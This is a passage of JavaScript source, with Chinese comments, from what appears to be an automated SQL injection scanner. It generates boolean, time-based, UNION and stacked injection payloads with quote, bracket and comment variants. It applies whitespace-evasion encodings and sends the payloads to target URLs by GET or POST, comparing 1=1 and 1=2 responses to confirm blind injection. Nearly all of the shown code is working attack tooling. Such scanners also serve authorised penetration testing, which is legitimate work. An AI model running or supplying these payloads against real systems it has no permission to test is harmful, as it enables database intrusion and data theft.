                payload: `${originalValue}")`,
                expected: `字段包裹符-双引号+小括号测试`,
                wrapperType: '双引号+小括号'
            });
        }
        if (selectedWrappers.includes('double_quote_parentheses_parentheses')) {
            baseTestCases.push({
                name: '字段包裹符-双引号+小括号+小括号',
                payload: `${originalValue}"))`,
                expected: `字段包裹符-双引号+小括号+小括号测试`,
                wrapperType: '双引号+小括号+小括号'
            });
        }
    } else {
        // 生成包含逻辑运算符的测试用例
        // "无"字段包裹符测试
        if (selectedWrappers.includes('none')) {
            baseTestCases.push({
                name: '字段包裹符-无',
                payload: `${originalValue} ${actualOperator} 1=1 -- `,
                expected: `字段包裹符-无测试`,
                wrapperType: '无'
            });
        }
        // 单引号包裹符测试
        if (selectedWrappers.includes('single_quote')) {
            baseTestCases.push({
                name: '字段包裹符-单引号',
                payload: `${originalValue}' ${actualOperator} '1'='1' -- `,
                expected: `字段包裹符-单引号测试`,
                wrapperType: '单引号'
            });
        }
        
        // 反引号包裹符测试
        if (selectedWrappers.includes('backtick')) {
            let basePayload = `${originalValue}'`;
            baseTestCases.push({
                name: '字段包裹符-反引号',
                payload: `${basePayload} ${actualOperator} 1=1 -- `,
                expected: `字段包裹符-反引号测试`,
                wrapperType: '反引号'
            });
        }
        
        // 双引号包裹符测试
        if (selectedWrappers.includes('double_quote')) {
            baseTestCases.push({
                name: '字段包裹符-双引号',
                payload: `${originalValue}" ${actualOperator} \"1\"=\"1\" -- `,
                expected: `字段包裹符-双引号测试`,
                wrapperType: '双引号'
            });
        }
        
        // 方括号包裹符测试
        if (selectedWrappers.includes('square_bracket')) {
            let basePayload = `${originalValue}`;
            baseTestCases.push({
                name: '字段包裹符-方括号',
                payload: `${basePayload}] ${actualOperator} 1=1 -- `,
                expected: `字段包裹符-方括号测试`,
                wrapperType: '方括号'
            });
        }
        
        // 小括号包裹符测试
        if (selectedWrappers.includes('parentheses')) {
            let basePayload = `${originalValue}`;
            baseTestCases.push({
                name: '字段包裹符-小括号',
                payload: `${basePayload} ${actualOperator} 1=1 -- `,
                expected: `字段包裹符-小括号测试`,
                wrapperType: '小括号'
            });
        }
        
        // 单引号+小括号包裹符测试
        if (selectedWrappers.includes('single_quote_parentheses')) {
            let basePayload = `${originalValue}')`;
            
            // 类型1: AND 1=1
            baseTestCases.push({
                name: '字段包裹符-单引号+小括号',
                payload: `${basePayload} ${actualOperator} 1=1 -- `,
                expected: `字段包裹符-单引号+小括号测试`,
                wrapperType: '单引号+小括号'
            });
            
            // 类型2: AND '1'='1'（完整引号）
            baseTestCases.push({
                name: '字段包裹符-单引号+小括号-完整引号',
                payload: `${basePayload} ${actualOperator} '1'='1' -- `,
                expected: `字段包裹符-单引号+小括号测试（完整引号）`,
                wrapperType: '单引号+小括号'
            });
            
            // 类型3: AND '1'='1（缺少结束引号）
            baseTestCases.push({
                name: '字段包裹符-单引号+小括号-缺少结束引号',
                payload: `${basePayload} ${actualOperator} '1'='1 -- `,
                expected: `字段包裹符-单引号+小括号测试（缺少结束引号）`,
                wrapperType: '单引号+小括号'
            });
        }
        
        // 单引号+中括号包裹符测试
        if (selectedWrappers.includes('single_quote_square_bracket')) {
            let basePayload = `${originalValue}']`;
            
            // 类型1: AND 1=1
            baseTestCases.push({
                name: '字段包裹符-单引号+中括号',
                payload: `${basePayload} ${actualOperator} 1=1 -- `,
                expected: `字段包裹符-单引号+中括号测试`,
                wrapperType: '单引号+中括号'
            });
            
            // 类型2: AND '1'='1'（完整引号）
            baseTestCases.push({
                name: '字段包裹符-单引号+中括号-完整引号',
                payload: `${basePayload} ${actualOperator} '1'='1' -- `,
                expected: `字段包裹符-单引号+中括号测试（完整引号）`,
                wrapperType: '单引号+中括号'
            });
            
            // 类型3: AND '1'='1（缺少结束引号）
            baseTestCases.push({
                name: '字段包裹符-单引号+中括号-缺少结束引号',
                payload: `${basePayload} ${actualOperator} '1'='1 -- `,
                expected: `字段包裹符-单引号+中括号测试（缺少结束引号）`,
                wrapperType: '单引号+中括号'
            });
        }
        
        // 小括号+小括号包裹符测试
        if (selectedWrappers.includes('parentheses_parentheses')) {
            let basePayload = `${originalValue}))`;
            baseTestCases.push({
                name: '字段包裹符-小括号+小括号',
                payload: `${basePayload} ${actualOperator} 1=1 -- `,
                expected: `字段包裹符-小括号+小括号测试`,
                wrapperType: '小括号+小括号'
            });
        }
        
        // 单引号+小括号+小括号包裹符测试
        if (selectedWrappers.includes('single_quote_parentheses_parentheses')) {
            let basePayload = `${originalValue}')`;
            baseTestCases.push({
                name: '字段包裹符-单引号+小括号+小括号',
                payload: `${basePayload}) ${actualOperator} 1=1 -- `,
                expected: `字段包裹符-单引号+小括号+小括号测试`,
                wrapperType: '单引号+小括号+小括号'
            });
        }
        
        // 双引号+小括号包裹符测试
        if (selectedWrappers.includes('double_quote_parentheses')) {
            let basePayload = `${originalValue}")`;
            
            // 类型1: AND 1=1
            baseTestCases.push({
                name: '字段包裹符-双引号+小括号',
                payload: `${basePayload} ${actualOperator} 1=1 -- `,
                expected: `字段包裹符-双引号+小括号测试`,
                wrapperType: '双引号+小括号'
            });
            
            // 类型2: AND "1"="1"（完整引号）
            baseTestCases.push({
                name: '字段包裹符-双引号+小括号-完整引号',
                payload: `${basePayload} ${actualOperator} \"1\"=\"1\" -- `,
                expected: `字段包裹符-双引号+小括号测试（完整引号）`,
                wrapperType: '双引号+小括号'
            });
            
            // 类型3: AND "1"="1（缺少结束引号）
            baseTestCases.push({
                name: '字段包裹符-双引号+小括号-缺少结束引号',
                payload: `${basePayload} ${actualOperator} \"1\"=\"1 -- `,
                expected: `字段包裹符-双引号+小括号测试（缺少结束引号）`,
                wrapperType: '双引号+小括号'
            });
        }
        
        // 双引号+中括号包裹符测试
        if (selectedWrappers.includes('double_quote_square_bracket')) {
            let basePayload = `${originalValue}"]`;
            
            // 类型1: AND 1=1
            baseTestCases.push({
                name: '字段包裹符-双引号+中括号',
                payload: `${basePayload} ${actualOperator} 1=1 -- `,
                expected: `字段包裹符-双引号+中括号测试`,
                wrapperType: '双引号+中括号'
            });
            
            // 类型2: AND "1"="1"（完整引号）
            baseTestCases.push({
                name: '字段包裹符-双引号+中括号-完整引号',
                payload: `${basePayload} ${actualOperator} \"1\"=\"1\" -- `,
                expected: `字段包裹符-双引号+中括号测试（完整引号）`,
                wrapperType: '双引号+中括号'
            });
            
            // 类型3: AND "1"="1（缺少结束引号）
            baseTestCases.push({
                name: '字段包裹符-双引号+中括号-缺少结束引号',
                payload: `${basePayload} ${actualOperator} \"1\"=\"1 -- `,
                expected: `字段包裹符-双引号+中括号测试（缺少结束引号）`,
                wrapperType: '双引号+中括号'
            });
        }
        
        // 双引号+小括号+小括号包裹符测试
        if (selectedWrappers.includes('double_quote_parentheses_parentheses')) {
            let basePayload = `${originalValue}"))`;
            baseTestCases.push({
                name: '字段包裹符-双引号+小括号+小括号',
                payload: `${basePayload} ${actualOperator} 1=1 -- `,
                expected: `字段包裹符-双引号+小括号+小括号测试`,
                wrapperType: '双引号+小括号+小括号'
            });
        }
        
        // 小括号包裹符测试 - 确保在有逻辑运算符时也生成
        if (selectedWrappers.includes('parentheses')) {
            let basePayload = `${originalValue})`;
            baseTestCases.push({
                name: '字段包裹符-小括号',
                payload: `${basePayload} ${actualOperator} 1=1 -- `,
                expected: `字段包裹符-小括号测试`,
                wrapperType: '小括号'
            });
        }
        
        // 单引号+双引号包裹符测试
        if (selectedWrappers.includes('single_quote_double_quote')) {
            let basePayload = `${originalValue}'"`;
            baseTestCases.push({
                name: '字段包裹符-单引号+双引号',
                payload: `${basePayload} ${actualOperator} 1=1 -- `,
                expected: `字段包裹符-单引号+双引号测试`,
                wrapperType: '单引号+双引号'
            });
        }
        
        // 双引号+单引号包裹符测试
        if (selectedWrappers.includes('double_quote_single_quote')) {
            let basePayload = `${originalValue}"`;
            baseTestCases.push({
                name: '字段包裹符-双引号+单引号',
                payload: `${basePayload}' ${actualOperator} 1=1 -- `,
                expected: `字段包裹符-双引号+单引号测试`,
                wrapperType: '双引号+单引号'
            });
        }
        
        // 十六进制包裹符测试
        if (selectedWrappers.includes('hex')) {
            let basePayload = `${originalValue}'`;
            baseTestCases.push({
                name: '字段包裹符-十六进制',
                payload: `${basePayload} ${actualOperator} 0x31=0x31 -- `,
                expected: `字段包裹符-十六进制测试`,
                wrapperType: '十六进制'
            });
        }
        
        // CHAR函数包裹符测试
        if (selectedWrappers.includes('char_function')) {
            let basePayload = `${originalValue}'`;
            baseTestCases.push({
                name: '字段包裹符-CHAR函数',
                payload: `${basePayload} ${actualOperator} CHAR(49)=CHAR(49) -- `,
                expected: `字段包裹符-CHAR函数测试`,
                wrapperType: 'CHAR函数'
            });
        }
    }
    
    // 生成带注释的测试用例
    addWrappedTestCases(baseTestCases);
    
    return fieldWrappers;
}

// 生成ORDER BY payload
function getOrderByPayload(injectionType, originalValue, fieldCount) {
    switch(injectionType) {
        case 'numeric':
            return `${originalValue} order by ${fieldCount}`;
        case 'string_single':
            return `${originalValue}' order by ${fieldCount} -- `;
        case 'string_double':
            return `${originalValue}" order by ${fieldCount} -- `;
        case 'bracket_single':
            return `${originalValue}') order by ${fieldCount} -- `;
        case 'bracket_double':
            return `${originalValue}") order by ${fieldCount} -- `;
        default:
            return `${originalValue} order by ${fieldCount}`;
    }
}



// 生成带注释变体的时间盲注payload
function getTimePayloadWithComment(injectionType, originalValue, delay, commentVariant, blindTechnique = 'time_blind_mysql') {
    // 基础时间盲注条件（不带注释）
    let timeFunction;
    
    // 根据不同的时间盲注选择时间函数
    switch(blindTechnique) {
        case 'time_blind_pg':
            timeFunction = `pg_sleep(${delay})`;
            break;
        case 'time_blind_mssql':
            timeFunction = `IF(1=1) WAITFOR DELAY '0:0:${delay}'`;
            break;
        case 'time_blind_mysql':
        default:
            timeFunction = `SLEEP(${delay})`;
            break;
    }
    
    // 构建基础payload，生成三种不同格式
    let basePayloads = [];
    switch(injectionType) {
        case 'string_single':
            if (blindTechnique === 'time_blind_mssql') {
                basePayloads.push(`${originalValue}'; ${timeFunction}`);
            } else {
                basePayloads.push(`${originalValue}' AND '1'='1 AND ${timeFunction}`);
                basePayloads.push(`${originalValue}' AND '1'='1' AND ${timeFunction}`);
                basePayloads.push(`${originalValue}' AND 1=1 AND ${timeFunction}`);
            }
            break;
        case 'string_double':
            if (blindTechnique === 'time_blind_mssql') {
                basePayloads.push(`${originalValue}"; ${timeFunction}`);
            } else {
                basePayloads.push(`${originalValue}" AND "1"="1 AND ${timeFunction}`);
                basePayloads.push(`${originalValue}" AND "1"="1" AND ${timeFunction}`);
                basePayloads.push(`${originalValue}" AND 1=1 AND ${timeFunction}`);
            }
            break;
        case 'bracket_single':
            if (blindTechnique === 'time_blind_mssql') {
                basePayloads.push(`${originalValue}'); ${timeFunction}`);
            } else {
                basePayloads.push(`${originalValue}') AND '1'='1 AND ${timeFunction}`);
                basePayloads.push(`${originalValue}') AND '1'='1' AND ${timeFunction}`);
                basePayloads.push(`${originalValue}') AND 1=1 AND ${timeFunction}`);
            }
            break;
        case 'bracket_double':
            if (blindTechnique === 'time_blind_mssql') {
                basePayloads.push(`${originalValue}"); ${timeFunction}`);
            } else {
                basePayloads.push(`${originalValue}") AND "1"="1 AND ${timeFunction}`);
                basePayloads.push(`${originalValue}") AND "1"="1" AND ${timeFunction}`);
                basePayloads.push(`${originalValue}") AND 1=1 AND ${timeFunction}`);
            }
            break;
        case 'numeric':
            if (blindTechnique === 'time_blind_mssql') {
                basePayloads.push(`${originalValue}; ${timeFunction}`);
            } else {
                basePayloads.push(`${originalValue} AND 1=1 AND ${timeFunction}`);
            }
            break;
        default:
            if (blindTechnique === 'time_blind_mssql') {
                basePayloads.push(`${originalValue}; ${timeFunction}`);
            } else {
                basePayloads.push(`${originalValue} AND 1=1 AND ${timeFunction}`);
            }
            break;
    }
    
    // 根据注释变体添加不同的注释到每个payload
    const payloadsWithComments = basePayloads.map(basePayload => {
        switch(commentVariant) {
            case 'no_comment':
                return basePayload;
            case 'double_dash':
                return `${basePayload} -- `;
            case 'double_dash_plus':
                return `${basePayload} --+`;
            case 'hash':
                return `${basePayload} #`;
            case 'multi_line':
                return `${basePayload} /*注释*/`;
            case 'inline':
                return `${basePayload} /*!SQL注入测试*/`;
            case 'double_dash_space':
                return `${basePayload} -- -`;
            default:
                return `${basePayload} -- `;
        }
    });
    
    return payloadsWithComments;
}

// 生成时间盲注payload（保持向后兼容）
function getTimePayload(injectionType, originalValue, delay) {
    const results = getTimePayloadWithComment(injectionType, originalValue, delay, 'double_dash');
    // 返回第一个结果，保持向后兼容
    return results[0];
}

// 生成UNION注入payload
function getUnionPayload(injectionType, originalValue, fieldCount) {
    let unionPayload = ` union select `;
    for (let i = 1; i <= fieldCount; i++) {
        unionPayload += `${i}`;
        if (i < fieldCount) {
            unionPayload += ',';
        }
    }
    
    // 添加多种注释方式，提高成功率
    const comments = [' -- ', ' #', ' --+', ' /*!*/'];
    const randomComment = comments[Math.floor(Math.random() * comments.length)];
    unionPayload += randomComment;
    
    // 使用-1作为初始值，确保原查询无结果，更容易观察union注入结果
    const initialValue = '-1';
    
    switch(injectionType) {
        case 'numeric':
            return `${initialValue}${unionPayload}`;
        case 'string_single':
            return `${initialValue}'${unionPayload}`;
        case 'string_double':
            return `${initialValue}"${unionPayload}`;
        case 'bracket_single':
            return `${initialValue}')${unionPayload}`;
        case 'bracket_double':
            return `${initialValue}")${unionPayload}`;
        default:
            return `${initialValue}${unionPayload}`;
    }
}

// 生成带注释变体的堆叠注入payload
function getStackPayloadWithComment(injectionType, originalValue, commentVariant) {
    // 基础堆叠注入命令（不带注释）
    const baseStackCommand = '; select 1';
    
    // 根据注释变体添加不同的注释
    let comment;
    switch(commentVariant) {
        case 'no_comment':
            comment = '';
            break;
        case 'double_dash':
            comment = ' -- ';
            break;
        case 'double_dash_plus':
            comment = ' --+';
            break;
        case 'hash':
            comment = ' #';
            break;
        case 'multi_line':
            comment = ' /*注释*/';
            break;
        case 'inline':
            comment = ' /*!SQL注入测试*/';
            break;
        case 'double_dash_space':
            comment = ' -- -';
            break;
        default:
            comment = ' -- ';
            break;
    }
    
    // 完整堆叠注入命令
    const stackCommand = `${baseStackCommand}${comment}`;
    
    switch(injectionType) {
        case 'string_single':
            return `${originalValue}'${stackCommand}`;
        case 'string_double':
            return `${originalValue}"${stackCommand}`;
        case 'bracket_single':
            return `${originalValue}')${stackCommand}`;
        case 'bracket_double':
            return `${originalValue}")${stackCommand}`;
        case 'stack':
            // 针对堆叠注入类型，返回带注释变体的堆叠注入payload
            return `${originalValue}'${stackCommand}`;
        default:
            return `${originalValue}${stackCommand}`;
    }
}

// 生成堆叠注入payload（保持向后兼容）
function getStackPayload(injectionType, originalValue) {
    return getStackPayloadWithComment(injectionType, originalValue, 'double_dash');
}

// 执行测试队列
function executeTestQueue() {
    // 如果队列中还有测试用例且未达到最大并发数，且未暂停
    while (testQueue.length > 0 && activeTests < maxConcurrency && isTesting && !isPaused) {
        const testItem = testQueue.shift();
        activeTests++;
        executeTest(testItem);
    }
    
    // 如果没有活跃测试且队列为空，测试完成
    if (activeTests === 0 && testQueue.length === 0) {
        testCompleted();
    }
    
    // 更新进度显示
    updateProgress();
}

// 执行单个测试
async function executeTest(testItem) {
    try {
        // 先执行1=1测试（恒真条件）
        const trueStartTime = Date.now();
        let trueTestUrl, truePostData;
        
        // 保存原始payload，用于后续执行1=2测试
        const originalPayload = testItem.testCase.payload;
        
        // 执行1=1测试
        if (testItem.config.requestMethod === 'POST') {
            trueTestUrl = testItem.url;
            truePostData = buildPostData(testItem);
        } else {
            trueTestUrl = buildTestUrl(testItem);
            truePostData = null;
        }
        
        const trueResponse = await sendRequest(trueTestUrl, testItem.config.timeout, testItem.config.requestMethod, truePostData, [testItem.testCase.spaceReplacement]);
        const trueEndTime = Date.now();
        const trueResponseTime = trueEndTime - trueStartTime;
        const trueResult = analyzeResponse(testItem, trueResponse, trueResponseTime);
        
        // 然后执行1=2测试（恒假条件）
        if (testItem.testCase.falsePayload) {
            let falseResponse = null;
            let falseResponseTime = 0;
            let falseResult = null;
            
            try {
                const falseStartTime = Date.now();
                let falseTestUrl, falsePostData;
                
                // 临时替换testCase的payload为falsePayload
                const tempPayload = testItem.testCase.payload;
                testItem.testCase.payload = testItem.testCase.falsePayload;
                
                if (testItem.config.requestMethod === 'POST') {
                    falseTestUrl = testItem.url;
                    falsePostData = buildPostData(testItem);
                } else {
                    falseTestUrl = buildTestUrl(testItem);
                    falsePostData = null;
                }
                
                // 恢复原始payload
                testItem.testCase.payload = tempPayload;
                
                falseResponse = await sendRequest(falseTestUrl, testItem.config.timeout, testItem.config.requestMethod, falsePostData, [testItem.testCase.spaceReplacement]);
                const falseEndTime = Date.now();
                falseResponseTime = falseEndTime - falseStartTime;
                falseResult = analyzeResponse(testItem, falseResponse, falseResponseTime);
            } catch (error) {
                // 1=2测试失败，生成错误结果
                falseResult = analyzeResponse(testItem, null, 0, error);
            }
            
            // 计算对比结果
            const lengthsMatch = trueResponse && trueResponse.body && falseResponse && falseResponse.body ? trueResponse.body.length === falseResponse.body.length : false;
            const contentsMatch = trueResponse && trueResponse.body && falseResponse && falseResponse.body ? trueResponse.body === falseResponse.body : false;
            
            // 保存原始1=1测试结果
            const originalTrueMessage = trueResult.message;
            
            // 布尔盲注检测：如果1=1和1=2响应内容不同，标记为注入点；否则不存在布尔盲注
            let blindInjectionResult = '';
            if (trueResult.status === 'positive') {
                // 已发现注入点，进一步检查是否为布尔盲注
                if (!lengthsMatch || !contentsMatch) {
                    // 1=1和1=2内容不同，确认存在布尔盲注
                    blindInjectionResult = '1=1和1=2响应内容不同，确认存在布尔盲注';
                    trueResult.riskLevel = 'high';
                } else {
                    // 1=1和1=2响应内容一致，降级为可疑注入点
                    trueResult.status = 'warning';
                    trueResult.message = originalTrueMessage;
                    blindInjectionResult = '1=1和1=2响应内容一致，降级为可疑注入点';
                    trueResult.riskLevel = 'medium';
                }
            } else if (trueResult.status === 'negative') {
                if (!lengthsMatch || !contentsMatch) {
                    // 1=1和1=2内容不同，存在布尔盲注
                    trueResult.status = 'positive';
                    trueResult.message = originalTrueMessage;
                    blindInjectionResult = '1=1和1=2响应内容不同，存在布尔盲注';
                    trueResult.riskLevel = 'high';
                } else {
                    // 1=1和1=2响应内容一致，不存在布尔盲注
                    blindInjectionResult = '1=1和1=2响应内容一致，不存在布尔盲注';
                }
            }
            
            // 添加组合测试结果
            addTestResult({
                ...testItem,
                testUrl: trueTestUrl,
                postData: truePostData,
                response: trueResponse,
                responseTime: trueResponseTime,
                result: trueResult,
                // 添加1=2测试的结果
                falseResponse: falseResponse,
                falseResponseTime: falseResponseTime,
                falseResult: falseResult,
                // 对比结果
                lengthsMatch: lengthsMatch,
                contentsMatch: contentsMatch,
                // 布尔盲注检测结果
                blindInjectionResult: blindInjectionResult,
                timestamp: new Date().toISOString()
            });
        } else {
            // 没有falsePayload，尝试根据payload生成并执行1=2测试
            let falseResponse = null;
            let falseResponseTime = 0;
            let falseResult = null;
            let falsePayload = null;
            
            // 根据payload生成falsePayload
            const payload = testItem.testCase.payload;
            if (payload) {
                // 更健壮的falsePayload生成逻辑
                let tempPayload = payload;
                
                // 处理不同的空格替换策略和注释变体
                // 1. 替换1=1为1=2，考虑不同的空格分隔
                tempPayload = tempPayload.replace(/1\s*=\s*1/g, '1=2');
                
                // 2. 替换'1'='1'为'1'='2'，考虑不同的引号类型
                tempPayload = tempPayload.replace(/'1'\s*=\s*'1'/g, "'1'='2'");
                tempPayload = tempPayload.replace(/"1"\s*=\s*"1"/g, '"1"="2"');
                
                // 3. 替换AND 1=1为AND 1=2，考虑大小写和空格
                tempPayload = tempPayload.replace(/(?:AND|and|\&\&)\s+1\s*=\s*1/g, 'AND 1=2');
                
                // 4. 替换OR 1=0为OR 1=1（如果存在）
                tempPayload = tempPayload.replace(/(?:OR|or|\|\|)\s+1\s*=\s*0/g, 'OR 1=1');
                
                // 5. 处理注释变体，确保替换不影响注释内容
                // 先移除注释，替换后再恢复注释
                const comments = [];
                let commentIndex = 0;
                
                // 移除单行注释
                tempPayload = tempPayload.replace(/--.*$/gm, (match) => {
                    comments.push(match);
                    return `__COMMENT_${commentIndex++}__`;
                });
                
                // 移除多行注释
                tempPayload = tempPayload.replace(/\/\*[\s\S]*?\*\//g, (match) => {
                    comments.push(match);
                    return `__COMMENT_${commentIndex++}__`;
                });
                
                // 再次执行替换，确保在无注释环境下替换
                tempPayload = tempPayload.replace(/1\s*=\s*1/g, '1=2');
                tempPayload = tempPayload.replace(/'1'\s*=\s*'1'/g, "'1'='2'");
                tempPayload = tempPayload.replace(/"1"\s*=\s*"1"/g, '"1"="2"');
                tempPayload = tempPayload.replace(/(?:AND|and|\&\&)\s+1\s*=\s*1/g, 'AND 1=2');
                
                // 恢复注释
                tempPayload = tempPayload.replace(/__COMMENT_(\d+)__/g, (match, index) => {
                    return comments[index] || match;
                });
                
                falsePayload = tempPayload;
            }
            
            // 执行1=2测试
            if (falsePayload) {
                try {
                    const falseStartTime = Date.now();
                    let falseTestUrl, falsePostData;
                    
                    // 临时替换testCase的payload为falsePayload
                    const tempPayload = testItem.testCase.payload;
                    testItem.testCase.payload = falsePayload;
                    
                    if (testItem.config.requestMethod === 'POST') {
                        falseTestUrl = testItem.url;
                        falsePostData = buildPostData(testItem);
                    } else {
                        falseTestUrl = buildTestUrl(testItem);
                        falsePostData = null;
                    }
                    
                    // 恢复原始payload
                    testItem.testCase.payload = tempPayload;
                    
                    falseResponse = await sendRequest(falseTestUrl, testItem.config.timeout, testItem.config.requestMethod, falsePostData, [testItem.testCase.spaceReplacement]);
                    const falseEndTime = Date.now();
                    falseResponseTime = falseEndTime - falseStartTime;
                    falseResult = analyzeResponse(testItem, falseResponse, falseResponseTime);
                } catch (error) {
                    // 1=2测试失败，生成错误结果
                    falseResult = analyzeResponse(testItem, null, 0, error);
                }
            } else {
                // 无法生成falsePayload，创建一个默认的错误结果
                falseResult = {
                    status: 'error',
                    message: '无法生成1=2测试用例',
                    riskLevel: 'low'
                };
            }
            
            // 计算对比结果
            const lengthsMatch = trueResponse && trueResponse.body && falseResponse && falseResponse.body ? trueResponse.body.length === falseResponse.body.length : false;
            const contentsMatch = trueResponse && trueResponse.body && falseResponse && falseResponse.body ? trueResponse.body === falseResponse.body : false;
            
            // 保存原始1=1测试结果
            const originalTrueMessage = trueResult.message;
            
            // 布尔盲注检测：如果1=1和1=2响应内容不同，标记为注入点；否则不存在布尔盲注
            let blindInjectionResult = '';
            if (trueResult.status === 'positive') {
                // 已发现注入点，进一步检查是否为布尔盲注
                if (!lengthsMatch || !contentsMatch) {
                    // 1=1和1=2内容不同，确认存在布尔盲注
                    blindInjectionResult = '1=1和1=2响应内容不同，确认存在布尔盲注';
                    trueResult.riskLevel = 'high';
                } else {
                    // 1=1和1=2响应内容一致，降级为可疑注入点
                    trueResult.status = 'warning';
                    trueResult.message = originalTrueMessage;
                    blindInjectionResult = '1=1和1=2响应内容一致，降级为可疑注入点';
                    trueResult.riskLevel = 'medium';
                }
            } else if (trueResult.status === 'negative') {
                if (!lengthsMatch || !contentsMatch) {
                    // 1=1和1=2内容不同，存在布尔盲注
                    trueResult.status = 'positive';
                    trueResult.message = originalTrueMessage;
                    blindInjectionResult = '1=1和1=2响应内容不同，存在布尔盲注';
                    trueResult.riskLevel = 'high';
                } else {
                    // 1=1和1=2响应内容一致，不存在布尔盲注
                    blindInjectionResult = '1=1和1=2响应内容一致，不存在布尔盲注';
                }
            }
            
            // 添加组合测试结果
            addTestResult({
                ...testItem,
                testUrl: trueTestUrl,
                postData: truePostData,
                response: trueResponse,
                responseTime: trueResponseTime,
                result: trueResult,
                // 添加1=2测试的结果
                falseResponse: falseResponse,
                falseResponseTime: falseResponseTime,
                falseResult: falseResult,
                // 对比结果
                lengthsMatch: lengthsMatch,
                contentsMatch: contentsMatch,
                // 布尔盲注检测结果
                blindInjectionResult: blindInjectionResult,
                timestamp: new Date().toISOString()
            });
        }
    } catch (error) {
        // 处理测试错误
        let testUrl;
        let postData;
        if (testItem.config.requestMethod === 'POST') {
            testUrl = testItem.url;
            postData = buildPostData(testItem);
        } else {
            testUrl = buildTestUrl(testItem);
            postData = null;
        }
        const testResult = analyzeResponse(testItem, null, 0, error);
        addTestResult({
        ...testItem,
        testUrl: testUrl,
        response: null,
        responseTime: 0,
        result: testResult,
        falseResponse: null,
        falseResponseTime: 0,
        falseResult: testResult,
        lengthsMatch: false,
        contentsMatch: false,
        timestamp: new Date().toISOString()
    });
    } finally {
        // 更新测试统计
        currentTestIndex++;
        activeTests--;
        updateProgress();
        
        // 继续执行队列
        executeTestQueue();
    }
}

// 构建测试URL
function buildTestUrl(testItem) {
    const url = new URL(testItem.url);
    const spaceReplacement = testItem.testCase.spaceReplacement || 'none';
    
    // 空格编码策略
    const spaceEncodingStrategies = {
        'none': (text) => text,  // 保持原样（默认）
        'tab': (text) => text.replace(/ /g, '%09'),  // 空格替换为制表符
        'newline': (text) => text.replace(/ /g, '%0A'),  // 空格替换为换行符
        'comment': (text) => text.replace(/ /g, '/**/'),  // 空格替换为SQL注释
        'plus': (text) => text.replace(/ /g, '+')  // 空格替换为+符号
    };
    
    // 对于"无"空格替代策略，直接构建自定义查询字符串，避免URLSearchParams自动编码空格为+
    if (spaceReplacement === 'none' && testItem.params) {
        const customParams = [];
        const currentParam = testItem.param.key;
        
        for (const [key, value] of Object.entries(testItem.params)) {
            if (key === currentParam) {
                // 对于当前测试参数，应用空格替代策略（none保持原样），只对特殊字符进行URL编码
                const encodedPayload = spaceEncodingStrategies[spaceReplacement](testItem.testCase.payload);
                customParams.push(`${encodeURIComponent(key)}=${encodeURIComponent(encodedPayload)}`);
            } else {
                // 对于其他参数，使用正常的URL编码
                customParams.push(`${encodeURIComponent(key)}=${encodeURIComponent(value)}`);
            }
        }
        
        // 构建自定义查询字符串
        url.search = customParams.join('&');
        return url.toString();
    }
    
    // 对于其他空格替代策略，使用URLSearchParams
    const params = new URLSearchParams(url.search);
    
    // 使用testItem.params中保存的原始值
    if (testItem.params) {
        // 遍历所有参数，添加到URL查询字符串中
        Object.entries(testItem.params).forEach(([key, value]) => {
            // 如果是当前测试的参数，使用测试用例的payload
            if (key === testItem.param.key) {
                // 先对payload应用空格替代策略
                const encodedPayload = spaceEncodingStrategies[spaceReplacement](testItem.testCase.payload);
                params.set(key, encodedPayload);
            } 
            // 否则使用保存的原始参数值
            else {
                params.set(key, value);
            }
        });
    }
    
    // 更新URL的查询字符串
    url.search = params.toString();
    
    return url.toString();
}

// 构建POST请求数据
function buildPostData(testItem) {
    const spaceReplacement = testItem.testCase.spaceReplacement || 'none';
    
    // 空格编码策略
    const spaceEncodingStrategies = {
        'none': (text) => text,  // 保持原样（默认）
        'tab': (text) => text.replace(/ /g, '%09'),  // 空格替换为制表符
        'newline': (text) => text.replace(/ /g, '%0A'),  // 空格替换为换行符
        'comment': (text) => text.replace(/ /g, '/**/'),  // 空格替换为SQL注释
        'plus': (text) => text.replace(/ /g, '+')  // 空格替换为+符号
    };
    
    // 对于"无"空格替代策略，直接构建自定义查询字符串，避免URLSearchParams自动编码空格为+
    if (spaceReplacement === 'none' && testItem.params) {
        const customParams = [];
        const currentParam = testItem.param.key;
        
        for (const [key, value] of Object.entries(testItem.params)) {
            if (key === currentParam) {
                // 对于当前测试参数，应用空格替代策略（none保持原样），只对特殊字符进行URL编码
                const encodedPayload = spaceEncodingStrategies[spaceReplacement](testItem.testCase.payload);
                customParams.push(`${encodeURIComponent(key)}=${encodeURIComponent(encodedPayload)}`);
            } else {
                // 对于其他参数，使用正常的URL编码
                customParams.push(`${encodeURIComponent(key)}=${encodeURIComponent(value)}`);
            }
        }
        
        return customParams.join('&');
    }
    
    // 对于其他空格替代策略，使用URLSearchParams
    const params = new URLSearchParams();
    
    // 使用testItem.params中保存的原始值
    if (testItem.params) {
        // 遍历所有参数，添加到POST数据中
        Object.entries(testItem.params).forEach(([key, value]) => {
            // 如果是当前测试的参数，使用测试用例的payload
            if (key === testItem.param.key) {
                // 先对payload应用空格替代策略
                const encodedPayload = spaceEncodingStrategies[spaceReplacement](testItem.testCase.payload);
                params.set(key, encodedPayload);
            } 
            // 否则使用保存的原始参数值
            else {
                params.set(key, value);
            }
        });
    }
    
    return params.toString();
}

// 构建POST请求数据（用于测试功能）
// originalPostData: 原始POST数据字符串
// paramKey: 要注入的参数名
// payload: 要注入的payload
// spaceReplacement: 空格替代策略
function buildPostDataForTest(originalPostData, paramKey, payload, spaceReplacement) {
    const spaceEncodingStrategies = {
        'none': (text) => text,  // 保持原样（默认）
        'tab': (text) => text.replace(/ /g, '%09'),  // 空格替换为制表符
        'newline': (text) => text.replace(/ /g, '%0A'),  // 空格替换为换行符
        'comment': (text) => text.replace(/ /g, '/**/'),  // 空格替换为SQL注释
        'plus': (text) => text.replace(/ /g, '+')  // 空格替换为+符号
    };
    
    // 对于"无"空格替代策略，直接构建自定义查询字符串，避免URLSearchParams自动编码空格为+
    if (spaceReplacement === 'none') {
        // 解析原始POST数据
        const params = new URLSearchParams(originalPostData || '');
        const customParams = [];
        
        for (const [key, value] of params.entries()) {
            if (key === paramKey) {
                // 对于当前测试参数，应用空格替代策略（none保持原样），只对特殊字符进行URL编码
                const encodedPayload = spaceEncodingStrategies[spaceReplacement](payload);
                customParams.push(`${encodeURIComponent(key)}=${encodeURIComponent(encodedPayload)}`);
            } else {
                // 对于其他参数，使用正常的URL编码
                customParams.push(`${encodeURIComponent(key)}=${encodeURIComponent(value)}`);
            }
        }
        
        return customParams.join('&');
    }
    
    // 对于其他空格替代策略，使用URLSearchParams
